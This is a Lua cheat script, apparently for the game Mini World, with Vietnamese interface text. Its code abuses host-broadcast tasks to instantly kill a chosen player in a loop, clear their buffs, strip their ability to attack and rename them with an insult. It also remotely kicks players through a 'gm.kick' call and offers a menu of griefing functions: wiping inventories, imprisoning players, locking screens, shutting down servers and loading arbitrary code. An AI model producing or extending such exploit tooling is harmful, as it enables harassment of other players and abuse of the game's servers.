            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                

                
                -- ===== 添加禁止攻击状态 =====
                
                -- ============================
                
                ShowGameTipsWithoutFilter("#c00ffffNgười chơi đã được chọn：" .. targetUin .. "，Bắt đầu đợt siêu tiêu diệt định kỳ (mục tiêu đã bị loại khỏi phạm vi tấn công)")
                
                -- 启动秒杀循环
                threadpool:work(function()
                    local myUin = AccountManager:getUin()
                    local loopCount = 0
                    
                    while _G.dtms_enabled do
                        loopCount = loopCount + 1
                        
                        -- 每10次重新施加禁止攻击（防止被清除）
                        if loopCount % 10 == 1 then
                            local keepDisable = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin, 32, false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                            end)
                        end
                        
                        local disableAttack = {
                    [1] = "player",
                    [2] = "forceOpenBoxUI",
                    [3] = {targetUin,797}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                   
                end)


                        local disableAttack = {
                    [1] = "player",
                    [2] = "forceOpenBoxUI",
                    [3] = {targetUin,798}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                   
                end)
                
                
                local disableAttack = {
                    [1] = "actor",
                    [2] = "setnickname",
                    [3] = {targetUin,'#R狗'}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                   
                end)
                
                local disableAttack = {
                    [1] = "actor",
                    [2] = "changeCustomModel",
                    [3] = {targetUin,[=[mob_3407]=]}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                   
                end)
                
                local disableAttack1 = {
                    [1] = "player",
                    [2] = "setActionAttrState",
                    [3] = {targetUin,32,false}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack1)
                   
                end)
                        
                        -- ===== 设置目标为可攻击状态 =====
                        local setAttackable = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {targetUin, 64, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable)
                        end)
                        -- ================================
                        
                        -- ===== 清除目标无敌buff =====
                        local clearBuff = {
                            [1] = "buff",
                            [2] = "clearAllBuff",
                            [3] = {targetUin}  -- 清除目标的所有buff
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)
                        end)
                        -- ===========================
                        
                        -- 播放特效
                        local t1 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {targetUin, "jiguang01", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1) 
                        end)
                        
                        local t10 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {targetUin, "aotu_06_leishenzhichui", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t10) 
                        end)
                        

                        

                        
                        -- 设置属性（可选）
                        local t2 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {targetUin, 1, 1}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t2) 
                        end)
                        local t3 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {targetUin, 1, 2}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t3) 
                        end)
                        
                        -- 造成伤害
                        local t4 = {
                            [1] = "actor",
                            [2] = "playerHurt",
                            [3] = {myUin, targetUin, 1.8e+308, 0}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t4) 
                        end)
                        
                        
                        
                        
                        -- 每10次显示一次提示
                        if loopCount % 10 == 0 then
                            ShowGameTipsWithoutFilter("#c00ffffBị tấn công " .. loopCount .. " Mạng")
                        end
                        
                        threadpool:wait(0.000000000000000000000000000000000000000000000000000001)  -- 0.1秒攻击一次
                    end
                    
                    -- ===== 秒杀结束后恢复目标的攻击能力 =====
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {targetUin, 32, true}  -- true = 恢复攻击
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        ShowGameTipsWithoutFilter("#c00ff00Khả năng tấn công của mục tiêu đã được khôi phục")
                    end)
                    -- ====================================
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp hạ gục tức thì kết thúc, tổng số lần tấn công " .. loopCount .. " lần")
                end)
            end
            -- ====================
        end
    end
)
end
	
--------------------------   
    
    
    
    
    
    
    

function AccChangeColorBtn_OnClick()
    local currentDevice = GetClientInfo():getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not deviceWhitelist[currentDevice] then
        ShowGameTipsWithoutFilter("#R此按钮仅限vip使用", 3)
        return
    end
    
    ShowTextInputSafe(function(text)
        -- 验证输入的迷你号是否有效
        local target = tonumber(text)
        if not target or target <= 1000 then
            ShowGameTipsWithoutFilter("#cff0000ID tài khoản Mini không hợp lệ (phải lớn hơn 1000)", 3)
            return
        end
        
        -- 循环执行踢人（这里原代码是固定循环10000次）
        
            AccountManager.cluster.buddysvr.routemore('gm.kick',target,54188)
            ShowGameTipsWithoutFilter("#RĐá từ xa", 3)  -- 这条提示会刷屏，建议移到外面
        
    end, "输入迷你号")
end

    
    function TaskTrackFrame_OnClick()
        local texta = { "Bánh Mì Nâng Cao" }
        
        local commonFuncs = {
            {
                { "Cấm vào phòng", jzjr },
                { "Trình mô phỏng phá bản đồ", ztmn },
                { "Chỉnh máu nhân vật", rwgx },
                { "Thay đổi bầu trời", gbtk },
                { "Không thể tấn công", wfgj },
                { "Tạo thuốc nổ", czzy },
                { "Chỉ định dịch chuyển lúc hoàng hôn", zdcsrl },
		{ "Pháp chú Đại Phật", dffz },
                { "Tôi xin lỗi", dffzgt },
                { "Chỉ định người chơi đi theo", wjgr },
                { "Hút cả nhóm", qtxr },
                { "Đặt điểm", szfs },
                { "Vương miện trên đầu", tdwg },
                { "Lặp xóa vật phẩm rơi", qcwp2 },
                { "Tạo BOSS", czgw },
                { "Phá khối", phfk },
                { "Tăng tốc nhân vật", rwjs },
                { "Xóa sạch túi đồ người chơi", qkwjbb },
                { "Buộc người chơi bò xuống", zdzl },
                { "Đổi thời tiết (nắng)", gbtq1 },
                { "Đổi thời tiết (sấm)", gbtq2 },
                { "Đổi thời tiết (tuyết)", gbtq3 },
                { "Đổi thời tiết (cát)", gbtq4 },
                { "Trọng lực bản đồ", dtzl },
                { "Cấm tấn công", jzgj },
                { "Mô phỏng phát ngôn", fzbr },
                { "Ngăn dịch chuyển", ycbr },
                { "Ngăn treo", fzbk },
                { "Tạo trứng nổ", czbbd },
                { "Động tác chờ", djdz },
                { "Nhận toàn bộ skin", hdqp },
                { "Hiệu ứng độc quyền", zstx },
                { "Danh sách đen phòng", fjhmd }
            },
            {
                { "Kích thước người chơi", wjdx },
                { "Tiêu diệt người chơi", buytr },
                { "Sinh lực người chơi", wjsm },
                { "Chỉ định bay", zdfx },
                { "Sức tấn công người chơi", wjgjl },
                { "Người chơi thất bại", wjsb },
                { "Chỉ định rung camera", ddjt },
                { "Hiệu ứng người chơi", wjtx },
                { "Người chơi tử vong", jbwj },
                { "Hồi sinh hư không", fhxk },
                { "Cấm di chuyển", jzyd },
                { "Tắt quyền", gbqx },
                { "Xoay người chơi", wjxz },
                { "Giam giữ người chơi", tjbf },
                { "Xóa người chơi", qcwj },
                { "Cảnh cáo người chơi", jgwj },
                { "Chỉ định buff", zdbf }
            },
            {
                { "Lấy vật phẩm máy chủ đám mây", bbqw },
                { "Tắt mô phỏng phát ngôn", gbmf },
                { "Bật quyền", kqqx },
                { "Bảy mươi hai phép biến hóa", qseb },
                { "Dịch chuyển tức thời", sjyd },
                { "Phát ngôn màu", csfy },
                { "Chỉ định người chơi ném vật phẩm", dtms },
                { "Tạo 78", czjb },
                { "Kích thước tùy chỉnh", zddx },
                { "Thời gian trôi", sjls },
                { "Triệu hồi thú cưng", zhcw },
                { "Triệu hồi thú cưỡi", zhzq },
                { "Skin vũ khí", wqpf },
                { "Tạo nhà tù", czjy },
                { "Chỉ định theo dõi", zdgz },
                { "Chế độ trước trận", jqms },
                { "Chỉ định nhấc người", zdjr },
                { "Điều khiển di chuyển", kzyd },
                { "Người chơi tự gây sát thương", wjzc },
                { "Cấm chat người chơi", jywj },
                { "Thú cưỡi nhanh", kjzq },
                { "Xóa buff", qcbf },
                { "Cày huy chương", sqxz },
                { "Thần uy giáng xuống", tjsw },
                { "Phát hiệu ứng âm thanh", bfyx },
                { "Bắn laser", fsjg },
                { "Lưu điểm hồi sinh người chơi", bcfhd },
                { "Cấp skin cho người chơi", gypf },
                { "Đổi đội", qhdw },
                { "Skin tùy chỉnh", zdpf },
                { "Khóa thời gian", sdsj },
                { "Vẽ người chơi", hzwj },
                { "Sinh vật tùy chỉnh", zdsw },
                 { "Tạo biển hoa", czhh },
                { "Chỉ định thêm bạn", zdhy },
                { "Khối dưới chân", jxfk },
                { "Cưỡi lên người chơi", qxwj },
                { "Đóng máy chủ đám mây", yfgb },
                { "Ném cả nhóm vào hư không", qtxk },
                { "Tâm ngắm phá khối", zxph }, 
                { "Tâm ngắm điều khiển người chơi", zxkz },
                { "Tâm ngắm cấp hiệu ứng", zxsw },
                { "Khu vực đấu đơn", dtly },
                { "Sửa tên màu", xgcm },  
                { "Ảnh đại diện tùy chỉnh", zdtx },
                { "Xóa vật phẩm rơi", qcwp },
                { "Tâm ngắm tạo dung nham", zxyj },
                { "Văn bản màn hình tùy chỉnh", pmwz } ,                        
                { "Bỏ qua cấm chat", wsjy },
                { "Chỉ định người chơi hạ gục tại tâm ngắm", wjzxms },
                { "Bỏ cấm vật phẩm cầm tay", jjsc },
                { "Miễn chỉnh sửa sáng tạo", mczbj },
                { "Tăng cường sinh vật tại tâm ngắm", jqsw },
                { "Chuyển sang khu vực Trung Quốc", qhrb }, 
                { "Chặn giao diện tử vong", pbsw }                       
            },
            {
                { "Cảm ơn bạn đã từng ghé qua", bf1 },
                { "Giới thiệu cá nhân", bf2 },
                { "Ta vốn gửi lòng theo trăng sáng", bf3 },
                { "Hành khúc cách mạng", bf4 },
                { "Vẫn sẽ nhớ bạn", bf5 },
                { "Rashomon", bf6 },
                { "Dành cho bạn", bf7 },
                { "Đạo sĩ Lao Sơn", bf8 },
                { "Càng lúc càng không hiểu", bf9 },
                { "Bài hát loa kép", bf10 }
            },
            {
                { "Giết tức thì đặc biệt (Luồng cực cao, không được dùng bừa bãi)", pctn1 },
                { "Hacker xâm nhập", pctn2 },
                { "tiêu diệt kẻ thù tên cầu vồng", pctn3 },
                { "Tiêu diệt kẻ thù siêu tốc", pctn4 },
                { "Siêu tiêu diệt NullVoid", pctn5 },
                { "Tiêu diệt kẻ thù siêu cực", pctn6 },
                { "Tiêu diệt kẻ thù đổi Sky", pctn7 },
                { "Triệu Hồi Boss Núi Lửa", pctn8 },
                { "Lệnh Siêu Tiêu Diệt", pctn9 },
                { "Việt Nam muôn năm!", pctn10 },
                { "Đức Phật tối cao", pctn11 },
                { "Giết chữ xanh dương", pctn12 },
                { "Chỉ định người khác giết", pctn13 }
            },
            {
                { "Cho phép người chơi đặt khối", pctv6 },
                { "Mở Tấn Công", pctv7 },
                { "Chỉnh sức tấn công bản thân", pctv8 },
                { "Đổi tên người chơi chỉ định", pctv9 },
                { "Bảy Màu", pctv10 },
                { "Thông tin trên đầu", pctv11 },
                { "Bắn vật ném hướng người chơi", pctv12 },
                { "Đổi thời tiết", pctv13 },
                { "Đổi trọng lực", pctv14 },
                { "Đổi thời gian", pctv15 },
                { "Spawn Rainbow chat", pctv16 },
                { "Skybox ID", pctv17 },
                { "Đổi khu vực quốc gia", pctv18 },
                { "Tốc độ thời gian", pctv19 },
                { "khôi phục xoá nhân vật", pctv20 },
                { "Mở khoá thời gian", pctv21 },
                { "Lưu điểm hồi sinh tất cả", pctv22 }
            },
            {
                { "Pháo hoa bắn mục tiêu", pctg1 },
                { "Chưa ra mắt", pctg2 },
                { "Tạo vùng dưới chân bạn", pctg3 },
                { "Tạo vùng bom size", pctg4 },
                { "Tạo khu vực hiệu ứng", pctg5 },
                { "Tạo vật ném trên trời", pctg6 },
                { "Tên bảy màu tránh crash", pctg7 },
                { "Quả cầu v2", pctg8 },
                { "Vật ném hướng người chơi", pctg9 },
                { "Vật ném tại vị trí", pctg10 },
            },
            {
                { "Kick toàn bộ điện thoại", pctk1 },
                { "Chưa ra mắt", pctk2 },
                { "Chưa ra mắt", pctk3 },
                { "Chưa ra mắt", pctk4 },
                { "Chưa ra mắt", pctk5 },
                { "Chưa ra mắt", pctk6 },
                { "Chưa ra mắt", pctk7 },
                { "Chưa ra mắt", pctk8 },
                { "Chưa ra mắt", pctk9 },
                { "Khoá màn hình người chơi", pctk10 }
            },
            {
                { "22 huân chương", pcty1 },
                { "Chỉnh vùng", pcty2 },
                { "Lấy vật phẩm số lượng", pcty3 },
                { "Tạo nhà tù kích thước", pcty4 },
                { "Đổi đội người chỉ định", pcty5 },
                { "Đổi đội toàn bộ", pcty6 },
                { "Tạo vòng tròn ID khối", pcty7 },
                { "Chỉ định người khác bắn!", pcty8 },
                { "Đổi tên bản thân", pcty9 },
                { "Tạo danh hiệu chỉ định", pcty10 },
                { "Hiệu ứng", pcty11 },
                { "Tiêu đề chống trung quốc", pcty12 },
                { "Đổi đội liên tục", pcty13 }
            },
            {
                { "Kẻ bị mọi người xa lánh", pcth1 },
                { "Người đáng bị cầm giam", pcth2 },
                { "Chế độ theo dõi", pcth3 },
                { "Tắt theo dõi", pcth4 },
                { "Mở nhạc tại vị trí", pcth5 },
                { "Chế độ theo dõi toàn bộ", pcth6},
                { "Chế độ sinh tồn toàn bộ", pcth7 },
                { "Khôi phục skybox", pcth8 },
                { "Chỉnh khung mẫu sky", pcth9 },
                { "Chỉnh bộ lọc màu", pcth10 },
                { "Skybox VIP", pcth11 }
            },
            {
                { "Bật tắt vô phòng Sever", pcyh1 },
                { "Xoá người chơi liên tục", pcyh2 },
                { "Chưa ra mắt", pcyh3 },
                { "Chưa ra mắt", pcyh4 },
                { "Chưa ra mắt", pcyh5 },
                { "Chưa ra mắt", pcyh6},
                { "Chưa ra mắt", pcyh7 }
            },
            {
                { "Mở di chuyển", pcrh1 },
                { "Đổi góc nhìn", pcrh2 },
                { "Chưa ra mắt", pcrh3 },
                { "Chưa ra mắt", pcrh4 },
                { "Chưa ra mắt", pcrh5 },
                { "Chưa ra mắt", pcrh6},
                { "Chưa ra mắt", pcrh7 }
            }
        }
        


-- Chế độ được cấp quyền không cần tra cứu DeviceID.
local accountFunctions = {}
if not DEVICE_AUTH_DISABLED then
    local a = GetClientInfo():getDeviceID()
    accountFunctions[a] = commonFuncs
end

        
        local function getDeviceID()
            local clientInfo = GetClientInfo()
            if not clientInfo then
                MessageBox(4, "获取客户端信息失败")
                return nil
            end
            local deviceID = clientInfo:getDeviceID()
            if deviceID then deviceID = deviceID:gsub("^%s+", ""):gsub("%s+$", "") end
            return (deviceID and deviceID ~= "") and deviceID or nil
        end
        
        local function getAuthorizedFunctions()
            local deviceID = getDeviceID()
            if not deviceID then
                MessageBox(4, "获取设备码失败")
                return nil
            end
            
            local funcList = accountFunctions[deviceID]
            if not funcList then
                MessageBox(4, "该设备未授权")
                return nil
            end
            return funcList
        end
        
        local authorizedFuncs
        if DEVICE_AUTH_DISABLED then
            authorizedFuncs = commonFuncs
        else
            authorizedFuncs = getAuthorizedFunctions()
        end
        if authorizedFuncs then Functions(texta, authorizedFuncs) end
    end
end

-- ==================== os_load函数 ====================
function os_load(ft, msgis, msgno)
    if gFunc_isStdioFileExist(filepath_root .. 'axdx/' .. ft .. '/1') then
        load_msg(msgis)
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/1')
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/3')
    elseif gFunc_isStdioFileExist(filepath_root .. 'axdx/' .. ft .. '/0') then
        load_msg(msgno)
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/0')
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/3')
    end
end

-- ==================== os_load调用 ====================
os_load("rwdx",   [===[ rwdx() ]===],   [===[ rwdx() ]===])
os_load("rwtx",   [===[ rwtx() ]===],   [===[ rwtx() ]===])
os_load("rwjs",   [===[ rwjs_speed() ]===], [===[ rwjs_speed() ]===])
os_load("zhjqr",  [===[ zhjqr() ]===],  [===[ zhjqr() ]===])
os_load("zdjqr",  [===[ zdjqr() ]===],  [===[ zdjqr() ]===])
os_load("zdkr",   [===[ zdkr() ]===],   [===[ zdkr() ]===])
os_load("tjzd",   [===[ tjzd() ]===],   [===[ tjzd() ]===])
os_load("jjzd",   [===[ jjzd() ]===],   [===[ jjzd() ]===])
os_load("gbfj",   [===[ gbfj() ]===],   [===[ gbfj() ]===])
os_load("gbtq",   [===[ gbtq() ]===],   [===[ gbtq() ]===])
os_load("cggj",   [===[ cggj() ]===],   [===[ cggj() ]===])
os_load("qzhy",   [===[ qzhy() ]===],   [===[ qzhy() ]===])
os_load("sqfw",   [===[ sqfw() ]===],   [===[ sqfw() ]===])
os_load("qswj",   [===[ qswj() ]===],   [===[ qswj() ]===])
os_load("ggmx",   [===[ ggmx() ]===],   [===[ ggmx() ]===])
os_load("wqfm",   [===[ wqfm() ]===],   [===[ wqfm() ]===])
os_load("Fxms",   [===[ Fxms(true) ]===], [===[ Fxms(false) ]===])
os_load("ydfh",   [===[ ydfh_all_1=true ydfh_all(0) ]===], [===[ ydfh_all_1=false ]===])
os_load("wdtz",   [===[ wdtz_all_1=true wdtz_all(0) ]===], [===[ wdtz_all_1=false ]===])
os_load("load_lua", [===[ lua_load_OnClick() ]===], [===[ lua_load_OnClick() ]===])
os_load("jdfk",   [===[ jdfk_all_1=true jdfk_all(0) ]===], [===[ jdfk_all_1=false ]===])